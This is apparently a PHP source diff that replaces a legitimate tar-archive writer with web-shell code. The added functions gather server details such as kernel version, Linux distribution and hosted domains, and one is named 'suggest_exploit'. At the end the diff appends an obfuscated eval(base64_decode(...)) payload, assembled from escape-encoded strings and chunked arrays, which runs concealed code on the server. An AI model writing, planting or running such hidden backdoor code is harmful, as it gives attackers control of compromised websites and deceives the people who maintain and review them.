-		if (($header['typeflag'] = $unpack_data['typeflag']) == '5')	$header['size'] = 0;
-		$header['filename'] = trim($unpack_data['filename']);
-		$header['mode'] = OctDec(trim($unpack_data['mode']));
-		$header['user_id'] = OctDec(trim($unpack_data['user_id']));
-		$header['group_id'] = OctDec(trim($unpack_data['group_id']));
-		$header['size'] = OctDec(trim($unpack_data['size']));
-		$header['time'] = OctDec(trim($unpack_data['time']));
-		return true;
-	}
-
-	function writeHeader($filename, $keep_filename){
-		$packF = 'a100a8a8a8a12A12';
-		$packL = 'a1a100a6a2a32a32a8a8a155a12';
-		if (strlen($keep_filename)<=0) $keep_filename = $filename;
-		$filename_ready = $this->makeGoodPath($keep_filename);
-
-		if (strlen($filename_ready) > 99){							//write long header
-		$dataFirst = pack($packF, '././LongLink', 0, 0, 0, sprintf('%11s ', DecOct(strlen($filename_ready))), 0);
-		$dataLast = pack($packL, 'L', '', '', '', '', '', '', '', '', '');
-
-        //  Calculate the checksum
-		$checksum = 0;
-        //  First part of the header
-		for ($i = 0; $i < 148; $i++)
-			$checksum += ord(substr($dataFirst, $i, 1));
-        //  Ignore the checksum value and replace it by ' ' (space)
-		for ($i = 148; $i < 156; $i++)
-			$checksum += ord(' ');
-        //  Last part of the header
-		for ($i = 156, $j=0; $i < 512; $i++, $j++)
-			$checksum += ord(substr($dataLast, $j, 1));
-        //  Write the first 148 bytes of the header in the archive
-		$this->writeBlock($dataFirst, 148);
-        //  Write the calculated checksum
-		$checksum = sprintf('%6s ', DecOct($checksum));
-		$binaryData = pack('a8', $checksum);
-		$this->writeBlock($binaryData, 8);
-        //  Write the last 356 bytes of the header in the archive
-		$this->writeBlock($dataLast, 356);
-
-		$tmp_filename = $this->makeGoodPath($filename_ready);
-
-		$i = 0;
-			while (($buffer = substr($tmp_filename, (($i++)*512), 512)) != ''){
-				$binaryData = pack('a512', $buffer);
-				$this->writeBlock($binaryData);
-			}
-		return true;
-		}
-		$file_info = stat($filename);
-		if (@is_dir($filename)){
-			$typeflag = '5';
-			$size = sprintf('%11s ', DecOct(0));
-		} else {
-			$typeflag = '';
-			clearstatcache();
-			$size = sprintf('%11s ', DecOct(filesize($filename)));
-		}
-		$dataFirst = pack($packF, $filename_ready, sprintf('%6s ', DecOct(fileperms($filename))), sprintf('%6s ', DecOct($file_info[4])), sprintf('%6s ', DecOct($file_info[5])), $size, sprintf('%11s', DecOct(filemtime($filename))));
-		$dataLast = pack($packL, $typeflag, '', '', '', '', '', '', '', '', '');
-		$checksum = 0;
-		for ($i = 0; $i < 148; $i++) $checksum += ord(substr($dataFirst, $i, 1));
-		for ($i = 148; $i < 156; $i++) $checksum += ord(' ');
-		for ($i = 156, $j = 0; $i < 512; $i++, $j++) $checksum += ord(substr($dataLast, $j, 1));
-		$this->writeBlock($dataFirst, 148);
-		$checksum = sprintf('%6s ', DecOct($checksum));
-		$binaryData = pack('a8', $checksum);
-		$this->writeBlock($binaryData, 8);
-		$this->writeBlock($dataLast, 356);
-		return true;
-	}
-
-	function openWrite(){
-		if ($this->isGzipped)
-			$this->tmp_file = gzopen($this->archive_name, 'wb9f');
-		else
-			$this->tmp_file = fopen($this->archive_name, 'wb');
-
-		if (!($this->tmp_file)){
-			$this->errors[] = __('Cannot write to file').' '.$this->archive_name;
-			return false;
-		}
-		return true;
-	}
-
-	function readBlock(){
-		if (is_resource($this->tmp_file)){
-			if ($this->isGzipped)
-				$block = gzread($this->tmp_file, 512);
-			else
-				$block = fread($this->tmp_file, 512);
-		} else	$block = '';
-
-		return $block;
-	}
-
-	function writeBlock($data, $length = 0){
-		if (is_resource($this->tmp_file)){
-		
-			if ($length === 0){
-				if ($this->isGzipped)
-					gzputs($this->tmp_file, $data);
-				else
-					fputs($this->tmp_file, $data);
-			} else {
-				if ($this->isGzipped)
-					gzputs($this->tmp_file, $data, $length);
-				else
-					fputs($this->tmp_file, $data, $length);
-			}
-		}
-	}
-
-	function closeTmpFile(){
-		if (is_resource($this->tmp_file)){
-			if ($this->isGzipped)
-				gzclose($this->tmp_file);
-			else
-				fclose($this->tmp_file);
-
-			$this->tmp_file = 0;
-		}
-	}
-
-	function makeGoodPath($path){
-		if (strlen($path)>0){
-			$path = str_replace('\\', '/', $path);
-			$partPath = explode('/', $path);
-			$els = count($partPath)-1;
-			for ($i = $els; $i>=0; $i--){
-				if ($partPath[$i] == '.'){
-                    //  Ignore this directory
-                } elseif ($partPath[$i] == '..'){
-                    $i--;
+        $count = 0;
+        foreach ($d0mains as $d0main) {
+            if (@strstr($d0main, "zone")) {
+                preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                flush();
+                if (strlen(trim($domains[1][0])) > 2) {
+                    flush();
+                    $count++;
                 }
-				elseif (($partPath[$i] == '') and ($i!=$els) and ($i!=0)){
-                }	else
-					$result = $partPath[$i].($i!=$els ? '/'.$result : '');
-			}
-		} else $result = '';
-		
-		return $result;
-	}
+            }
+        }
+        $dom = "$count Domain";
+    }
+    return $dom;
+}
+
+function linux_version()
+{
+    $pecah = explode(" ", $GLOBALS['fungsi'][11]());
+    $pcah = explode("-", $pecah[2]);
+    return $pcah[0];
+}
+
+function perms($file)
+{
+    $perms = fileperms($file);
+    if (($perms & 0xC000) == 0xC000) {
+        // Socket
+        $info = 's';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        // Symbolic Link
+        $info = 'l';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        // Regular
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        // Block special
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        // Directory
+        $info = 'd';
+    } elseif (($perms & 0x2000) == 0x2000) {
+        // Character special
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        // FIFO pipe
+        $info = 'p';
+    } else {
+        // Unknown
+        $info = 'u';
+    }
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
+
+function hex($n)
+{
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+function unhex($y)
+{
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+function suggest_exploit()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1];
+}
+function distro_linux()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    return $xplod[6];
+}
+function kernel_angka()
+{
+    $uname = $GLOBALS['fungsi'][11]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    return $xpld[0];
+}
+function namaFile()
+{
+    $namesc = $_SERVER['SCRIPT_NAME'];
+    $expl = explode("/", $namesc);
+    return end($expl);
+}
+function awalanFile($namas)
+{
+    $namafile = $namas;
+    $pech = explode(".", $namafile);
+    return $pech[0];
+}
+function pwdnostrip()
+{
+    $pwd_exists = $GLOBALS['fungsi'][9]();
+    $xpl1 = str_replace("/", "", $pwd_exists);
+    return $xpl1;
 }
 ?>
+<?php $A9zE1Agm="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($A9zE1Agm("JFBBazZPZFlKWD0iNWM4ZGM3MjMxZjg4NjRhMzllOWYzOWU0YTZjMWY4MWIiOyRLTm0ybzg5YW00PWFycmF5KCk7JEtObTJvODlhbTRbMF09IklEOCtQZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDVEOXdhSEFnSkVsUE9WSnZaRWgyUFNKY2VEWXlYREUwTVZ4NE56TmNlRFkxWEhnek5seDRNelJjZURWbVhERTBORnd4TkRWY2VEWXpYSGcyWmx4NE5qUmNNVFExSWp0bGRtRnNLQ1JKVHpsU2IyUklkaWdpU2tkS2JsTnROWEJrYmxwQ1ZYb3dhVTVYVFRSYVIwMHpUV3BOZUZwcVp6Uk9hbEpvVFhwc2JFOVhXWHBQVjFVd1dWUmFhazFYV1RSTlYwbHBUM2xTUlZkSFdtaGxWVlpyVmtSa1FsQlhSbmxqYlVZMVMiOyRLTm0ybzg5YW00WzFdPSIwTnJOMHBGVWM5ZjBmODk1ZmI5OGFiOTE1OWY1MWZkMDI5N2UyMzZkbGxhYlVZMVVsZFNWVTR3Um1KTlJqQTVTV3RzUlU5RGRGRmFWRkpyV1ZST2FVNHlXbWxaYlU1c1RXcE5NRTVYVVROT2VtTjVXV3BCTWs1NlVtaE5la1UwV2tSV1JVOVlaR2hUUlVadVVUSnNVMkZYU1hwVmJGWnBUVzVTYzFsdGJFSlBWV3hFV1hwS1RtVnRaRFZVYm5CS1pXc3hObEZVUWxCaE1GcERWV3BKYVU5NVVrVlhSMXBvWlZWV2ExWkVaRUpYZWtaa1VGTktUMUV4WkhGVFZGWm9Va2ROTlZwcVFtIjskS05tMm84OWFtNFsyXT0iMVBSR3N4VzhmMTRlNDVmY2VlYTE2N2E1YTM2ZGVkZDRiZWEyNTQzbTFKTlU5SFJtbFBWRVV4VDFkWk1VMVhXbXROUkVrMVRqSlZlVTE2V210YWVsSnNVbFZ3VkZwWE1VZFNiRTEzVjJ4R1RtVnJTblZXVlZwM1lVVjRXV0pITVdwTk1uaERXV3hhYjFWcmNEWmpNbVJFWVZaS2NVbHFjMnRTUm1odFdWaHNSbHBHVVROUlZuTjVXRlF3YVZsVlpFZE5SazVXVlZSb2JVMVVVbXhPUkZadFdUSldiRmxVUlRKT01rVXhXVlJOTWxwSFZtdGFSRkpwV2xkRmVVNVVVWHBhTVVKVVVWYyI7JEtObTJvODlhbTRbM109IjFUYzgxZTcyOGQ5ZDRjMmY2MzZmMDY3Zjg5Y2MxNDg2MmMxWkhaRFpVYlhCdVRVVXhSVkpVVGs1aFYwMHpVMVZHZGxvd1RuQlZibVJxWWxScmQxbHFTazlrYlVwRVVWUnNTbEo1U1RkS1JWSlpXbTFHTlZKWFVsVk9NRVppVFRFd09VbHRlRFpaZW1kNFdsUmplVTlIVVRWYVJGSnFUVzFaTWsxNldtMU5SRmt6V21wbk5Wa3lUWGhPUkdjeVRXMU9hazFzV1hkVE1FNVRXbXhWZDFac1RsZGhNVnBVVmpOc2ExTldXa2RWYkVaV1pWZFNhMU14VGtKaVZYQndVVmQwV1UxVk5VZFciOyRLTm0ybzg5YW00WzRdPSJWM2hlY2NiYzg3ZTRiNWNlMmZlMjgzMDhmZDlmMmE3YmFmM2hVbXhXYzJNeU5HbFBlVkpGVjBkYWFHVlZWbXRXUkdSQ1YzcFNaRkJUU2xSU2JFcHNXVEpPYVZsNlp6TmFWRkpwVGxkT2JFMXRXbXhOYW1kNlRVUm9iVnBFYkcxTmJVVXpXVzFHYlUweFZsWlNhekYxVjBaT1FrOVdRbFZOUjJSTFRXcHNNVk51YkVKTU1HeEVVMjA1YTFOR1NqTlpNM0IyWkd0NE5WTlhaRkJoVlVad1dWVm9VMDFIVGtWSmFuTnJVa1pvYlZsWWJFWmFSbEV6VVZaek1WaFVNR2xpTWswd1dUSkZNIjskS05tMm84OWFtNFs1XT0iRWM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliMXFUVFJaVkVKcFQxUkplazlFU1hkYVIwNXFUbFJCTlZsVVdtMU9lbFUwVGtSc2FXUnJlRFZUVkdSS1VWYzVjbGxWWXpWbGJWSkVVVlJzU2xFeFNtMVdWRUpYVlRGYWNsWnNUbGhsVjFKS1ZtdGFVMVZXWjNkaFJrSldUVlpHZFZkR1VucGFlVWszU2tWU1dWcHRSalZTVjFKVlRqQkdZazVzTURsSmEwNXdWVzV3V2swd2NIZFplbXh0VFVkWk5FOVVWbTFaYW1zMFdWZEpOVTFVVlRWYWFsVjRXbTFSZDAxcWF6TmFWRSI7JEtObTJvODlhbTRbNl09Imw2VG0xU2FsYzlmMGY4OTVmYjk4YWI5MTU5ZjUxZmQwMjk3ZTIzNmROR1JtNVZSazVDWVRGbmVGUnJXbFppUm5CSFZsZDRlbUpzVmtaaFJrWlpUVlUxUjFaRlZscGliR2hWWXpKa1JHRlZSa3hUYTJOcFQzbFNSVmRIV21obFZWWnJWa1JrUWxkNlpHUlFVMHBoWTBkS1NGWnNXbFpoTWswMVdtcENiVTlFYXpGYWJVazFUMGRHYVU5VVJURlBWMWt4VFZkYWEwMUVTVFZPTWxWNVRYcGFhMlF5WkZGVk1FWnlXVEJvUzJSdFVraFBWM0JwVFc1a2JsUkhiRUpoTWtaSVQxaHdhMUUiOyRLTm0ybzg5YW00WzddPSJ3UmpGVFZVNWM5ZjBmODk1ZmI5OGFiOTE1OWY1MWZkMDI5N2UyMzZkVFpXeHJlbE51UW1wVFJrVXpTV3B6YTFKR2FHMVpXR3hHV2taUk0xRldjelJZVkRCcFUxVkdkbG93VG5CTlZGa3pUMVJCTlUxWFRURlpWR2MwVFVkYWFGcHFXbTFaYWxac1RtcEJORTR5Vm1sTlYwbDVXa2RPVTAxR2NGaGxSM2hoVFRCd2IxbHNWa2RWVms1VVVWUnNTbEV5VW5aYVJXaFRaREpPTm1JeldrMU5hMW96V1ZaTk1VMUdjRmhsUjNoaFRYbEpOMHBGVWxsYWJVWTFVbGRTVlU0d1JtSlBWakE1IjskS05tMm84OWFtNFs4XT0iU1d0d2IxMTY3OTA5MWM1YTg4MGZhZjZmYjVlNjA4N2ViMWIyZGNsc1RtaFBSR1J0V21wWk0wOVhSWGxhYWs1c1RucEdhMDlVUlRSTlYwVXlUakpKTTA1VVVYbE5WRWw1V1hwV01sa3lNV3BrYkd4MFQxUkNTMlZWUmpGVFZVNVRZVmRKZWxWc1ZtbE5ibEp6V1cxc1FtUlZiRVJaTTFwcVRXeGFNVmRyVlhoaVIwMTZWRzFuYVU5NVVrVlhSMXBvWlZWV2ExWkVaRUpYZWtWM1dGUXdhVmRxU2xaYVYwNXFXVzFOTkU0eVZUQlphbFpxV2xSS2JWcFVTVFJOZWtFMFdtMVJOVnBxUyI7JEtObTJvODlhbTRbOV09Im1oT01hODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY2twb1dtcE9kVlF6YkVKVE1IQklUVmQ0YWswd05XOVhha3BXV2pGQ1ZGRlhOVk5pVjNoNlYyeE9RMkZHY0VoVmJteGhWMFUxTmxReWJFSmlhMnhFVGtka1MxSjVTVGRLUlZKWldtMUdOVkpYVWxWT01FWmlUVlJHWkZCVFNtRmpSMHBJVm14YVZtRXpZekJPVjAwd1QwZE9hbHBVU214TmJWRXpXbTFLYTFwWFJYaFpWMXBxVGxSR2FrNHlUVEpaVjFGNVRtcGtTbEZYT1c1Uk1teFRZVzFHUkZGVWJFcFNNRFI0V1QiOyRLTm0ybzg5YW00WzEwXT0iSXhOZWNjYmM4N2U0YjVjZTJmZTI4MzA4ZmQ5ZjJhN2JhZjNGcHRSbGhPV0VKclVUSmtjbHBGWkZkak1YQllXa2hzV2xaNlJrTkphbk5yVWtab2JWbFliRVphUmxFelVWWnplRTFzTURsSmJGWkdZVE5DVUdWVlJreFhWRkV4V1hwUk5Ga3lUbXhOYlZWNVdrUmtiVmx0VW14WlZFWm9XbTFOTVUxWFRUTlplbHBvV2tSSk1rMHhXalZaYTFrMVpXeHdXVlZ1V21wVFJrWjJVMnRrVDJJd2VFUlJhMUpYVm10d1RsWkVSa05XVm1kNFVXeENWazFXUm5wVFZWRnBUM2xTUlZkSFdtaCI7JEtObTJvODlhbTRbMTFdPSJsVlZaclZrUms0NWM0OGNjZTJlMmQ3ZmJkZWExYWZjNTFjN2M2YWQyNlFsZDZSWHBZVkRCcFVsaENVRnBYVG1wWmJVMDBUakpWTUZscVZtcGFWRXB0V2xSSk5FMTZRVFJhYlZFMVdtcEthRTR5U21oYWFrNDFVVlYwV2sweFdqVlphMWsxWld4d1dWVnVXbXBUUmtaMlUydGtUMkl3ZUVSUmExSlhWbXR3VGxaRVJrTldWbWQ0VVd4Q1ZrMVdTa2hWTVZaWFZGTkpOMHBGVWxsYWJVWTFVbGRTVlU0d1JtSk5WRkprVUZOS1UxSnJNWHBUVldSdlRVZFJNRTVYVFRCUFIwNXFXbFJLIjskS05tMm84OWFtNFsxMl09ImJFMXRVVE5hYjQ1YzQ4Y2NlMmUyZDdmYmRlYTFhZmM1MWM3YzZhZDI2VXByV2xkRmVGbFhXbXBPVkVacVRqSk5NbGxYVVhsT2EyaERXbXhzZFZadVFtbFNNVXB0V1RGb1YySkhUblZoTWpsYVYwVndOVmRXYUhKaU1HOTVWRzA1V2xkR1NtMVpWbVJTWW10c1JVbHFjMnRTUm1odFdWaHNSbHBHVVROUlZuTjRUbFl3T1VscVFYSlRWVTVvVDBSa2JWcHFXVE5QVjBWNVdtcE9iRTU2Um10UFZFVTBUVmRGTWs0eVNUTk9WRkY1VFZSSmVWa3hTbkZaVldSSFRVWk9WbFZZVGtwUk0iOyRLTm0ybzg5YW00WzEzXT0ibEYzZWNjYmM4N2U0YjVjZTJmZTI4MzA4ZmQ5ZjJhN2JhZjNWMnhvYjAxRmNEVlJWR3hSWVZWR2NsbHNaRmRsYlUxNVVtMDFZVlV5ZEhkVE1WSjZXakJPZEZScVJXbFBlVkpGVjBkYWFHVlZWbXRXUkdSQ1YzcEZNbGhVTUdsWk1qRTBXbTFOZVUxVVdUTlBWRUUxVFZkTk1WbFVaelJOUjFwb1dtcGFiVmxxVm14T2FrRTBUakpXYVUxWFNYbGFSMDVYVFVkSmVsRnFRa3hSTVVweFdWVk9NMW94UlhoV2JFNVZVbFJzVWxacldUVlZNVXBYVld4YVZtRjZWbFpXVjNSSFZERlZkMSI7JEtObTJvODlhbTRbMTRdPSJkcldsWmhVMGs0NWM0OGNjZTJlMmQ3ZmJkZWExYWZjNTFjN2M2YWQyNjNTa1ZTV1ZwdFJqVlNWMUpWVGpCR1lrMVVaR1JRVTBveldYcFNhbGxVVVhsTmVtaG9UVWRKTlUxcVRUUk5ha0pyV1RKTk1VMUViR2hPYlZrelRsUm5NRTlYU201YVJXaExUVlp3VkdGNlpFcFJXRUp4V2tab1MyTXhaM3BVYlhoclVucHNNMXBGVG01aE1XdDVXak5PU2xKVk5WZFdWM1EwVlVaV1IxVnRXbFpOVlRWT1NXcHphMUpHYUcxWldHeEdXa1pSTTFGV2MzaFBSakE1U1d4bmVGZHJXbFpoTW5oIjskS05tMm84OWFtNFsxNV09IklXWHBhODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY3NiVTFIV1RSUFZGWnRXV3ByTkZsWFNUVk5WRlUxV21wVmVGcHRVWGROYW1zeldsUkplazV0VWxoV2EwcEhWV3hhU21Nd2JFaFhiV2hwVTBVMWMxTXhVbnBhTUU1d1VWVjBTMU5GY0hOWmVrNVhZekpTUkZGVWJFcFNNRFI0V1RJd2FVOTVVa1ZYUjFwb1pWVldhMVpFWkVKWGVrVTFXRlF3YVdWSFdtRlhSMmh6VjFoc2JtRXhhM2xhTTBKUVpWVkdURmRVVGxkbFYwcEhUMWR3YVZKNmJEWlhiRTV1WVRGcmVWb3oiOyRLTm0ybzg5YW00WzE2XT0iUWxCbFZVMTY3OTA5MWM1YTg4MGZhZjZmYjVlNjA4N2ViMWIyZGNaTVZVaHZNRTlHUVhwUmJUbHFVVEJGT1VscWMydFpiRlY1VFVSSmVrMUVZM2hOUkVFelRrUkZNRTlFTUdsWVNHY3lUV3gzZUU1RVJtTmxSR042V0Vobk1rNVdlRFJOZWxwalpVUk5NRmhJWnpGYWJIZDRUa1JTWTAxVVVURllTR2N5VFRGNE5FNXRXbU5sUkZrd1dFUkZNRTVUU1RkS1JrNU9ZVVJKZDAxcVRYZE9la1YzVFVSak1FMVVVVFJKUkRCblUxUkthV013VWxkTmEzTjVUVVJKZWsxRVkzaE5SRUV6VCI7JEtObTJvODlhbTRbMTddPSJrYzRjYTQyMzhhMGI5MjM4MjBkY2M1MDlhNmY3NTg0OWJSRk1FOURaMnRTUm1odFdWaHNSbHBHVVROUlUzZHJXVzFrUzJKdGJESmthMFpVUzFSMGJXUlhOV3BrUjJ4MlltbENTazF0U25wU1JsbDVVM3BKZDAxcVRYZE9la1YzVFVSak1FMVVVVFJMUTFKb1dsTjNhMkV5VmpWTFUwSTNTVU5TYUdSRU1XaGpia3BvWlZObmNFOTVRbTFpTTBsblMwTlNjRkJVUVRkSlExSndTVVIzWjJNelVubGlSMVoxUzBOU2NscFlhM0JQZVVGcllWTnpja3RUUWpkSlIyeHRTVU5vY0dKdVVqIjskS05tMm84OWFtNFsxOF09IkpaVjNkdlNrYzlmMGY4OTVmYjk4YWI5MTU5ZjUxZmQwMjk3ZTIzNmRkMGJHVldjMnRoVmpCd1VHcEJjRWxJYzJkS1IwWXdWM2xTY0ZoVU1HdGhNbFkxVjNsU2NGaFVjMmRtVTBJNVNVTlNhR1JFTVdoamJrcG9aVlk1TWxsWGVERmFXRTF2U2tkR01FdFVjMmRLU0U0d1kyb3dhVWxxYzJkYWJUbDVTVU5uYTJGVU1IZFBlVUZyWVZOQk9FbEhUblprVnpVd1MwTlNhRnBUYXpkSlExSndTM2x6Y0VsSWMyZGhWMWxuUzBOU2NGQkRRbXBpTTFaMVpFTm5hMWxYVlhCTVZFVndTVU4iOyRLTm0ybzg5YW00WzE5XT0iU2VtUklTWFZRV0U0d1kydzVlVnBZUW5OWlYwNXNTMGN4YTA1VFoydFpXRkppU2tkc1pFdFRkMmRKYVVselNVTlNhRnBXYzJ0aFZqQndUM2xDYkdKSVRteEpRMUo2WkVoSmRWQlRVbWhhVm5OcllWWXdOMGxJTUdkamJWWXdaRmhLZFVsRFVucGtTRWszU1VneGJHUnRSbk5MUTFKcFZsUkpkMDFxVFhkT2VrVjNUVVJqTUUxVVVUUkxRMUpVVkZkbmVVMUVTWHBOUkdONFRVUkJNMDVFUlRCUFEydHdUM2M5UFNJcEtUc2dQejRLUEQ5d2FIQWciOyRjazIwMjMwNzEwMDc0NTI5PSJceDYyXDE0MVx4NzNceDY1XHgzNlx4MzRceDVmXDE0NFwxNDVceDYzXHg2Zlx4NjRcMTQ1IjskemdsMjAyMzA3MTAwNzQ1MjkgPSBSa29TOGhBNTIwMjMwNzEwMDc0NTI5KCRLTm0ybzg5YW00LCRQQWs2T2RZSlgpO2Z1bmN0aW9uIFJrb1M4aEE1MjAyMzA3MTAwNzQ1MjkoJGFlLCRrZXkpIHsgJGF0PWFycmF5KCk7IGZvciAoJGk9MDsgJGkgPCBzdHJsZW4oJGtleSk7ICRpKyspIHsgaWYgKGludHZhbCgka2V5WyRpXSk+MCkgeyAkYXRbJGldPSRrZXlbJGldOyB9IH0gJGF0PWFycmF5X3ZhbHVlcygkYXQpOyAkc3RyPSIiOyBmb3IgKCRpPTA7ICRpIDwgY291bnQoJGFlKTsgJGkrKykgeyBpZiAoJGk8IGNvdW50KCRhZSktMSkgJHN0ci49c3RyX3JlcGxhY2UobWQ1KCRhdFskaV0pLCAiIiwgJGFlWyRpXSk7IGVsc2UgJHN0ci49JGFlWyRpXTsgfSByZXR1cm4gJHN0cjsgfWV2YWwoJGNrMjAyMzA3MTAwNzQ1MjkoJHpnbDIwMjMwNzEwMDc0NTI5KSk7")); ?>
